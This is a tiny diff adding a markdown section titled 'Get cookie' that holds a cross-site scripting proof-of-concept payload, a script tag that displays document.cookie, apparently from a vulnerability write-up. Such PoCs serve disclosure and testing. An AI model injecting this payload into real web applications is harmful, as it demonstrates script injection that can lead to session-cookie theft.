@@ -1,1 +1,5 @@
-#!
+## Get cookie
+```
+nu11secur1ty<script>alert(document.cookie)</script>
+```
+
